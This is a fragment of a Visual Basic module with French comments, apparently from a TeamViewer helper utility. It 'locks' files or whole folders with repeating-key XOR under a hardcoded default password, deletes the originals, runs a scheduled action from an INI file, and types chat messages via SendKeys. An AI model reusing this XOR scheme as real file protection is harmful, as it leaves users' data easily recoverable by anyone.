For i = 0 To lg_encrypted_loc - 1
    tf(ls3 + i) = td(i) Xor tc(j)
    j = j + 1
    If j > l Then j = 0
    DoEvents
Next i
' on complète avec la suite non cryptée
'--------------------------------------
CopyMemory tf(ls3 + lg_encrypted_loc), td(lg_encrypted_loc), ld - lg_encrypted_loc
' Le nom du fichier
'------------------
Name1 = Prefix & Name
' Ecriture du fichier
'--------------------
F_Num = FreeFile
On Error GoTo Lock_Files_err
Open Folder & "\" & Name1 For Binary Access Write As F_Num
Put F_Num, , tf
Close F_Num
Kill Folder & "\" & Name

Lock_Files_err:

End Sub

Public Sub Lock_File_old(Folder As String, Name As String, Prefix As String, PW As String)

Dim F_Num As Integer
Dim i As Long
Dim j As Long
Dim l As Long
Dim Name1 As String
Dim s_crc As String

Dim s3 As String
Dim ls3 As Long
Dim td() As Byte
Dim tc() As Byte
Dim tf() As Byte
Dim ld As Long
Dim tcrc(lg_crc - 1) As Byte

' Lecture intégrale du fichier
'-----------------------------
On Error GoTo Lock_Files_err
F_Num = FreeFile
Open Folder & "\" & Name For Binary Access Read As F_Num
ld = LOF(F_Num)
If ld = 0 Then Exit Sub
ReDim td(ld - 1)
Get F_Num, , td
Close F_Num
' Si le fichier est déjà verrouillé, on sort (verrouillé : le début commance par "lock")
'---------------------------------------------------------------------------------------
For i = 0 To Len("lock") - 1
    If td(i) <> Asc(Mid("lock", i + 1, 1)) Then Exit For
Next i
If i > Len("lock") - 1 Then Exit Sub
' CRC sur les lg_crc premiers caractères
'---------------------------------------
For i = 0 To lg_crc - 1
    tcrc(i) = td(i)
Next i
s_crc = Format(CRC16B(tcrc))
' On met le PW sous forme de tableau de bytes
'--------------------------------------------
ReDim tc(Len(PW) - 1)
For i = 0 To Len(PW) - 1
    tc(i) = Asc(Mid(PW, i + 1, 1))
Next i
' On prépare le tableau de bytes de sortie avec son début
'--------------------------------------------------------
s3 = "lock" & Prefix & "|" & Format(Len(s_crc)) & s_crc
ls3 = Len(s3)
ReDim tf(ls3 + ld - 1)
For i = 0 To ls3 - 1
    tf(i) = Asc(Mid(s3, i + 1, 1))
Next i
' Modification non destructif du contenu et stockage dans la suite du tableau de sortie
'--------------------------------------------------------------------------------------
l = Len(PW) - 1
j = 0
For i = 0 To ld - 1
    tf(i + ls3) = td(i) Xor tc(j)
    j = j + 1
    If j > l Then j = 0
    DoEvents
Next i
' Le nom du fichier
'------------------
Name1 = Prefix & Name
' Ecriture du fichier
'--------------------
F_Num = FreeFile
On Error GoTo Lock_Files_err
Open Folder & "\" & Name1 For Binary Access Write As F_Num
Put F_Num, , tf
Close F_Num
Kill Folder & "\" & Name

Lock_Files_err:

End Sub

Public Sub Unlock_Files(Name As String, Password As String)

Dim s As String
Dim F_Num As Integer
Dim s1 As String
Dim s2 As String
Dim i As Long
Dim j As Long
Dim k As Integer
Dim l As Long
Dim Prefix As String
Dim Name1 As String
Dim Folder1 As String
Dim s_crc As String
Dim l_crc As Integer
Dim PW As String
Dim S_Sansétoile As String
Dim FolderContent As Boolean
Dim Extension As String

' Mot de passe
'-------------
If Password = "" Then
    PW = "Such a nice day"
Else
    PW = Password
End If
' Extraction de la partie sans étoiles et de l'extension éventuelle (filtre)
'---------------------------------------------------------------------------
i = InStr(1, Name, "*")
If i > 0 Then
    For j = i - 1 To 1 Step -1
        If Mid(Name, j, 1) = "\" Then Exit For
    Next j
    S_Sansétoile = Left(Name, j - 1)
    For k = Len(Name) To i + 1 Step -1
     If Mid(Name, k, 1) = "." Then Exit For
    Next k
    Extension = Right(Name, Len(Name) - k)
Else
    S_Sansétoile = Name
    Extension = ""
End If
' Est-ce un répertoire ?
'-----------------------
If (Dir(S_Sansétoile) = "") And (Dir(S_Sansétoile, vbDirectory) <> "") Then
    FolderContent = True
Else
    FolderContent = False
End If

' S'il s'agit d'un fichier unique...
'-----------------------------------
If Not FolderContent Then
    ' Le répertoire et le nom du fichier
    '-----------------------------------
    For i = Len(S_Sansétoile) To 1 Step -1
        If Mid(S_Sansétoile, i, 1) = "\" Then Exit For
    Next i
    If i > 0 Then
        Folder1 = Left(S_Sansétoile, i - 1)
        Name1 = Right(S_Sansétoile, Len(S_Sansétoile) - i)
    Else
        Folder1 = ""
        Name1 = S_Sansétoile
    End If
    ' Test de la présence du fichier
    '-------------------------------
    If Dir(Folder1 & "\" & Name1) = "" Then Exit Sub
    ' Déverrouillage du fichier
    '--------------------------
    Unlock_File Folder1, Name1, PW

' S'il s'agit du contenu d'un répertoire...
'------------------------------------------
Else
    Name1 = Dir(S_Sansétoile & "\")
    While Name1 <> ""
        DoEvents
        If (Right(Name1, Len(Extension)) = Extension) Or (Extension = "") Or (Extension = "*") Then
            Unlock_File S_Sansétoile, Name1, PW
        End If
        Name1 = Dir
    Wend
End If
Exit Sub

Unlock_Files_err:

End Sub

Public Sub Unlock_File(Folder As String, Name As String, Password As String)

Dim s As String
Dim F_Num As Integer
Dim s1 As String
Dim s2 As String
Dim i As Long
Dim j As Long
Dim l As Long
Dim Prefix As String
Dim Name1 As String
Dim s_crc As String
Dim l_crc As Integer
Dim PW As String


Dim s3 As String
Dim ls3 As Long
Dim td() As Byte
Dim tc() As Byte
Dim tf() As Byte
Dim ld As Long
Dim tcrc(lg_crc - 1) As Byte
Dim nb_entête As Long
Dim c As String
Dim lg_encrypted_loc As Long

' Mot de passe
'-------------
If Password = "" Then
    PW = "Such a nice day"
Else
    PW = Password
End If
' On met le PW sous forme de tableau de bytes
'--------------------------------------------
ReDim tc(Len(PW) - 1)
For i = 0 To Len(PW) - 1
    tc(i) = Asc(Mid(PW, i + 1, 1))
Next i
' Lecture intégrale du fichier
'-----------------------------
F_Num = FreeFile
Open Folder & "\" & Name For Binary Access Read As F_Num
ld = LOF(F_Num)
If ld = 0 Then Exit Sub
ReDim td(ld - 1)
Get F_Num, , td
Close F_Num
' Si le fichier n'est pas verrouillé, on sort
'--------------------------------------------
For i = 0 To Len("lock") - 1
    If td(i) <> Asc(Mid("lock", i + 1, 1)) Then Exit For
Next i
If i <> Len("lock") Then Exit Sub
' Extraction du préfixe et du crc
'--------------------------------
Prefix = ""
For i = Len("lock") To 200
    If i >= ld Then Exit Sub
    If td(i) = Asc("|") Then Exit For
    Prefix = Prefix & Chr(td(i))
Next i
If td(i) <> Asc("|") Then Exit Sub
l_crc = Val(Chr(td(i + 1)))
s_crc = ""
For j = 0 To l_crc - 1
    s_crc = s_crc & Chr(td(i + 2 + j))
Next j
' Nombre total de caractères de l'entête à supprimer
'---------------------------------------------------
nb_entête = i + 2 + l_crc
' Restauration du contenu (les lg_encrypted premiers caractères seulement sont cryptés)
'--------------------------------------------------------------------------------------
l = Len(PW) - 1
j = 0
If lg_encrypted + nb_entête > ld Then
    lg_encrypted_loc = ld - nb_entête
Else
    lg_encrypted_loc = lg_encrypted
End If
ReDim tf(ld - nb_entête - 1)
For i = 0 To lg_encrypted_loc - 1
    tf(i) = td(nb_entête + i) Xor tc(j)
    j = j + 1
    If j > l Then j = 0
    DoEvents
Next i
' On complète avec la partie non cryptée
'---------------------------------------
If (nb_entête + lg_encrypted_loc) < ld Then
    CopyMemory tf(lg_encrypted_loc), td(nb_entête + lg_encrypted_loc), ld - nb_entête - lg_encrypted_loc
End If
' Vérification du crc (sur les lg_crc premiers caractères)
'---------------------------------------------------------
For i = 0 To lg_crc - 1
    tcrc(i) = tf(i)
Next i
If s_crc <> Format(CRC16B(tcrc)) Then Exit Sub
' Restauration du nom
'--------------------
i = InStr(1, Name, Prefix)
If i = 1 Then
    Name1 = Right(Name, Len(Name) - Len(Prefix))
Else
    Name1 = Name
End If
' Ecriture du fichier
'--------------------
F_Num = FreeFile
On Error Resume Next
Kill Folder & "\" & Name1
On Error GoTo Unlock_File_err
Open Folder & "\" & Name1 For Binary Access Write As F_Num
Put F_Num, , tf
Close F_Num
If Name <> Name1 Then Kill Folder & "\" & Name

Exit Sub

Unlock_File_err:

End Sub


Public Sub Unlock_File_old(Folder As String, Name As String, Password As String)

Dim s As String
Dim F_Num As Integer
Dim s1 As String
Dim s2 As String
Dim i As Long
Dim j As Long
Dim l As Long
Dim Prefix As String
Dim Name1 As String
Dim s_crc As String
Dim l_crc As Integer
Dim PW As String


Dim s3 As String
Dim ls3 As Long
Dim td() As Byte
Dim tc() As Byte
Dim tf() As Byte
Dim ld As Long
Dim tcrc(lg_crc - 1) As Byte
Dim nb_entête As Long

' Mot de passe
'-------------
If Password = "" Then
    PW = "Such a nice day"
Else
    PW = Password
End If
' On met le PW sous forme de tableau de bytes
'--------------------------------------------
ReDim tc(Len(PW) - 1)
For i = 0 To Len(PW) - 1
    tc(i) = Asc(Mid(PW, i + 1, 1))
Next i
' Lecture intégrale du fichier
'-----------------------------
F_Num = FreeFile
Open Folder & "\" & Name For Binary Access Read As F_Num
ld = LOF(F_Num)
If ld = 0 Then Exit Sub
ReDim td(ld - 1)
Get F_Num, , td
Close F_Num
' Si le fichier n'est pas verrouillé, on sort
'--------------------------------------------
For i = 0 To Len("lock") - 1
    If td(i) <> Asc(Mid("lock", i + 1, 1)) Then Exit For
Next i
If i <> Len("lock") Then Exit Sub
' Extraction du préfixe et du crc
'--------------------------------
Prefix = ""
For i = Len("lock") To 200
    If i >= ld Then Exit Sub
    If td(i) = Asc("|") Then Exit For
    Prefix = Prefix & Chr(td(i))
Next i
If td(i) <> Asc("|") Then Exit Sub
l_crc = Val(Chr(td(i + 1)))
s_crc = ""
For j = 0 To l_crc - 1
    s_crc = s_crc & Chr(td(i + 2 + j))
Next j
' Nombre total de caractères de l'entête à supprimer
'---------------------------------------------------
nb_entête = i + 2 + l_crc
' Restauration du contenu
'------------------------
l = Len(PW) - 1
j = 0
ReDim tf(ld - nb_entête - 1)
For i = 0 To ld - nb_entête - 1
    tf(i) = td(i + nb_entête) Xor tc(j)
    j = j + 1
    If j > l Then j = 0
    DoEvents
Next i
' Vérification du crc (sur les lg_crc premiers caractères)
'---------------------------------------------------------
For i = 0 To lg_crc - 1
    tcrc(i) = tf(i)
Next i
If s_crc <> Format(CRC16B(tcrc)) Then Exit Sub
' Restauration du nom
'--------------------
i = InStr(1, Name, Prefix)
If i = 1 Then
    Name1 = Right(Name, Len(Name) - Len(Prefix))
Else
    Name1 = Name
End If
' Ecriture du fichier
'--------------------
F_Num = FreeFile
On Error Resume Next
Kill Folder & "\" & Name1
On Error GoTo Unlock_File_err
Open Folder & "\" & Name1 For Binary Access Write As F_Num
Put F_Num, , tf
Close F_Num
If Name <> Name1 Then Kill Folder & "\" & Name

Exit Sub

Unlock_File_err:

End Sub


Public Function RemoveQuotes(s As String) As String

If (Left(s, 1) = """") And (Right(s, 1) = """") Then
    RemoveQuotes = Mid(s, 2, Len(s) - 2)
Else
    RemoveQuotes = s
End If

End Function

Public Function CRC16A(s As String) As Long

Dim i As Long
Dim Temp As Long
Dim CRC As Long
Dim j As Integer

For i = 1 To Len(s)
    Temp = AscW(Mid(s, i, 1)) * &H100&
    CRC = CRC Xor Temp
        For j = 0 To 7
            If (CRC And &H8000&) Then
                CRC = ((CRC * 2) Xor &H1021&) And &HFFFF&
            Else
                CRC = (CRC * 2) And &HFFFF&
            End If
        Next j
Next i
CRC16A = CRC And &HFFFF

End Function

Public Function CRC16B(Buffer() As Byte) As Long

Dim i As Long
Dim Temp As Long
Dim CRC As Long
Dim j As Integer

For i = 0 To UBound(Buffer) - 1
    Temp = Buffer(i) * &H100&
    CRC = CRC Xor Temp
        For j = 0 To 7
            If (CRC And &H8000&) Then
                CRC = ((CRC * 2) Xor &H1021&) And &HFFFF&
            Else
                CRC = (CRC * 2) And &HFFFF&
            End If
        Next j
Next i
CRC16B = CRC And &HFFFF

End Function


Public Sub Go_ScheduledAction()

Dim s As String

s = LireIni("Schedule_Action", "Action", Fic_ini)
s = Desencaps(s)
GoTv s

End Sub


Public Function Desencaps(s As String) As String

Dim s1 As String
Dim c As String
Dim i As Long

' Désencapsulation (on remplace les Chr(17) par CR, les chr(18)par LF et les chr(19) par des espaces)
'----------------------------------------------------------------------------------------------------
s1 = ""
For i = 1 To Len(s)
    c = Mid(s, i, 1)
    Select Case c
        Case Chr(17):
            s1 = s1 & Chr(13)
        Case Chr(18):
            s1 = s1 & Chr(10)
        Case Chr(19):
            s1 = s1 & " "
        Case Else
            s1 = s1 & c
    End Select
Next i

Desencaps = s1

End Function


Public Function Get_D_PC_Name(ligne As String)

Dim i As Integer

i = InStr(1, ligne, "Return")
If i = 1 Then
    Get_D_PC_Name = "Error"
Else
    i = InStr(1, UCase(ligne), UCase(Trim((L_Prefix & " " & PC_Name & " " & ToolPW))))
    If i = 1 Then
        Get_D_PC_Name = ""
    ElseIf i > 1 Then
        Get_D_PC_Name = Left(ligne, i - 2)
    Else
        Get_D_PC_Name = "Error"
    End If
End If

End Function

Public Function Prefix_answer() As String

If Current_D_PC_Name = "" Then
    Prefix_answer = "Return " & L_Prefix & " " & PC_Name & " "
Else
    Prefix_answer = "Return " & L_Prefix & " " & Current_D_PC_Name & " " & PC_Name & " "
End If

End Function

Public Function GetTheMoreLeftAndMoreTop() As PointType

Dim N As Long
Dim X As Long
Dim Y As Long
Dim i As Integer

EnumDisplayMonitors 0, ByVal 0&, AddressOf MonitorEnumProc, N
X = 0
Y = 0
For i = 0 To N - 1
    If rcMonitors(i).Left = X Then
        If rcMonitors(i).Top < Y Then Y = rcMonitors(i).Top
    ElseIf rcMonitors(i).Left < X Then
        X = rcMonitors(i).Left
        Y = rcMonitors(i).Top
    End If
Next i

GetTheMoreLeftAndMoreTop.X = X
GetTheMoreLeftAndMoreTop.Y = Y

End Function

Public Function MonitorEnumProc(ByVal hMonitor As Long, ByVal hdcMonitor As Long, lprcMonitor As RECT, dwData As Long) As Long
    ReDim Preserve rcMonitors(dwData)
    rcMonitors(dwData) = lprcMonitor
    UnionRect rcVS, rcVS, lprcMonitor 'merge all monitors together to get the virtual screen coordinates
    dwData = dwData + 1 'increase monitor count
    MonitorEnumProc = 1 'continue
End Function


Public Sub SendChatConfession()

Dim s_Room As String
Dim s_Message As String
Dim i As Long
Dim s As String
Dim c As String
Dim j As Long

' Look for the last used chat room in the log file
'-------------------------------------------------
s_Room = GetLastChatRoom

' If no chat room found, then exit
'---------------------------------
If s_Room = "" Then Exit Sub

' If this room has never been used, then...
'------------------------------------------
For i = 1 To nb_t_ChatRooms
    If t_ChatRooms(i) = s_Room Then Exit For
Next i
If i > nb_t_ChatRooms Then
    ' Add this room in the list
    '--------------------------
    nb_t_ChatRooms = nb_t_ChatRooms + 1
    ReDim Preserve t_ChatRooms(nb_t_ChatRooms)
    t_ChatRooms(nb_t_ChatRooms) = s_Room
    ' Message to be sent
    '-------------------
    s_Message = LireIni("CHAT", "SetChatConfession", Fic_ini)
    ' If the message is empty, then, the function must be disabled
    '-------------------------------------------------------------
    If Trim(s_Message) = "" Then
        ChatConfession_On = False
        Exit Sub
    End If
    ' Make the TV Chat Window active and send the message
    '----------------------------------------------------
    If SetFocus_TVMainWindow Then
        ' We send line by line (separator = "|"
        '--------------------------------------
        s = ""
        For j = 1 To Len(s_Message)
            c = Mid(s_Message, j, 1)
            If c = "|" Then
'                Sendkeys s & "^" & Chr(13)
                Sendkeys s & Chr(13)
                s = ""
            Else
                s = s & c
            End If
        Next j
        Sendkeys s & Chr(13)
    End If
End If

End Sub

Public Function GetLastChatRoom() As String

Dim s As String
Dim sss As String
Dim sl As String
Dim c As String
Dim j As Long
Dim k As Long
Dim l As Long
Dim m As Long
Dim d1 As Double
Dim d2 As Double

Dim sss2 As String

GetLastChatRoom = ""

' Ouverture fichier des log
' WARNING!!! The log file name and path must be set for each PC configuration --> To be developped
'-------------------------------------------------------------------------------------------------
On Error Resume Next
Open "C:\Program Files (x86)\TeamViewer\TeamViewer13_Logfile.log" For Input As #1
' Lecture de tout son contenu
'----------------------------
s = Input(LOF(1), #1)
' Pour chaque lignes en partant de la fin
'----------------------------------------
j = Len(s)
On Error GoTo sortie
Do
    ' lecture de la ligne
    '--------------------
    sl = ""
    If j <= 0 Then Exit Do
    For k = 0 To j - 1
        c = Mid(s, j - k, 1)
        If c <> Chr(13) Then
            If c = Chr(10) Then
                Exit For
            Else
                sl = c + sl
            End If
        End If
    Next k
    j = j - k - 1
    ' Analyse de la ligne
    '--------------------
    ' Recherche de "SendRegularChatMessage"
    '--------------------------------------
    ' Exemple : 2018/08/30 15:45:30.476  5420  6100 G1   ChatRoomHandler::SendRegularChatMessage[sendChatMessageCb]: sent message = {ba6e235d-870a-4ac4-ad3a-dfbaef6ace0f} (writtenAt = 2018-Aug-30 13:45:30.560000) for room {d4fabb24-e9ea-4abd-bedc-c3d3c2f077fd}
    l = InStr(1, sl, "SendRegularChatMessage")
    ' Si non trouvé, on sort
    '-----------------------
    If l <= 0 Then GoTo Suite_Boucle
    ' Recherche de "for room {"
    '--------------------------
    l = InStr(1, sl, "for room {")
    ' Si non trouvé, on sort
    '-----------------------
    If l <= 0 Then GoTo Suite_Boucle
    ' On se positionne sur le premier caractère de l'ID de Room
    '----------------------------------------------------------
    l = l + 10
    ' On recherche l'accolade fermante
    '---------------------------------
    m = InStr(l, sl, "}")
    ' Si non trouvé, on sort
    '-----------------------
    If m <= 0 Then GoTo Suite_Boucle
    ' On a l'ID de Room, on teste la date car doit être récente (1 minute)
    '---------------------------------------------------------------------
    d1 = Val(Mid(sl, 1, 4) & Mid(sl, 6, 2) & Mid(sl, 9, 2) & Mid(sl, 12, 2) & Mid(sl, 15, 2) & Mid(sl, 18, 2))
    If Mid(sl, 15, 2) < 59 Then
        d1 = d1 + 100
    ElseIf Mid(sl, 12, 2) < 23 Then
        d1 = d1 - 59 + 10000
    End If
    d2 = Val(Format(Now, "YYYYMMDDhhmmss"))
    If d1 < d2 Then GoTo sortie
    GetLastChatRoom = Mid(sl, l, m - l)
    ' On a fini
    '----------
    GoTo sortie
Suite_Boucle:
Loop

sortie:
Close #1

End Function
